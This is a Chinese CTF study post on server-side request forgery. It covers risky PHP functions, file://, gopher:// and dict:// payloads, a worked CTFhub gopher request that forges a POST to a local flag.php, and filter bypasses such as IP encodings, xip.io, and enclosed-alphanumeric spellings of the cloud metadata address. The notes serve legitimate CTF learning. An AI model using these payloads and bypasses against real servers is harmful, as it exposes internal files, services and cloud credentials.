---
title: SSRF漏洞
date: 2026-02-06 13:56:58
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/img/image-20260210230031954.png
categories: CTF
---

## 危险函数

- file_get_contents()
- fsockopen()
- curl_exec()

## 协议利用

### File协议

```
file:///etc/passwd
```

假设某网站有一个 SSRF 漏洞点，比如通过`?url=`参数让服务器发起请求：

- 正常请求：`http://xxx.com/?url=http://baidu.com` → 服务器会请求百度，返回结果；
- 利用 SSRF 读取文件：`http://xxx.com/?url=file:///var/www/html/flag.php` → 服务器会解析 file 协议，读取本地的`flag.php`，并将文件内容返回给攻击者，攻击者就能拿到 flag。

### Gopher 协议

```
gopher://fuzz.wuyun.org:8080/gopher
```

#### [CTFhub]POST请求

![image-20260206142539776](https://gitee.com/bobrocket/img/raw/master/img/image-20260206142539776.png)

先访问flag.php，查看源码获得key

![image-20260206142619920](https://gitee.com/bobrocket/img/raw/master/img/image-20260206142619920.png)

![image-20260206143935466](https://gitee.com/bobrocket/img/raw/master/img/image-20260206143935466.png)

构造请求，然后url编码两次

```
POST%20/flag.php%20HTTP/1.1%0A%0AHost:%20127.0.0.1:80%0A%0AContent-Type:%20application/x-www-form-urlencoded%0A%0AContent-Length:%2036%0A%0A%0A%0Akey=806a99fae96b19fcdc1f6a7c096e519f

把 %0A 换为 %0D%0A

在进行一次URL编码   
POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:%2520127.0.0.1:80%250d%250AContent-Type:%2520application/x-www-form-urlencoded%250d%250AContent-Length:%252036%250d%250A%250d%250Akey=806a99fae96b19fcdc1f6a7c096e519f

payload
构造 gopher 协议包含请求
gopher://127.0.0.1:80/_POST%2520/flag.php%2520HTTP/1.1%250d%250AHost:%2520127.0.0.1:80%250d%250AContent-Type:%2520application/x-www-form-urlencoded%250d%250AContent-Length:%252036%250d%250A%250d%250Akey=806a99fae96b19fcdc1f6a7c096e519f
```

### Dict 协议

```
dict://fuzz.wuyun.org:8080/helo:dict
```

这种URL Scheme能够引用允许通过DICT协议使用的定义或单词列表

## 绕过姿势

### @

```
可以尝试采用http基本身份认证的方式绕过
如：http://www.aaa.com@www.bbb.com@www.ccc.com，在对@解析域名中，不同的处理函数存在处理差异
在PHP的parse_url中会识别www.ccc.com，而libcurl则识别为www.bbb.com。
```

### 短网址

[链接缩短工具 - 一键缩短网址,微信防封防红,实时数据追踪 | 爱短链](https://www.aifabu.com/mark/duanlian/?channel=MA&keyword=duanwangzhi&node=短网址)

### 采用进制转换

127.0.0.1八进制：0177.0.0.1 十六进制：0x7f.0.0.1 十进制：2130706433.

![image-20260206153807585](https://gitee.com/bobrocket/img/raw/master/img/image-20260206153807585.png)

### 指向任意 ip 的域名

```
xip.io：http://127.0.0.1.xip.io/==>http://127.0.0.1/
```

### 利用句号

```
127。0。0。1 ==>127.0.0.1
```

### 利用封闭的字母数字

```
利用Enclosed alphanumerics
ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ >>> example.com
http://169.254.169.254>>>http://[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]
List:
① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳
⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇
⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛
⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵
Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ
ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ
⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴
⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿
```

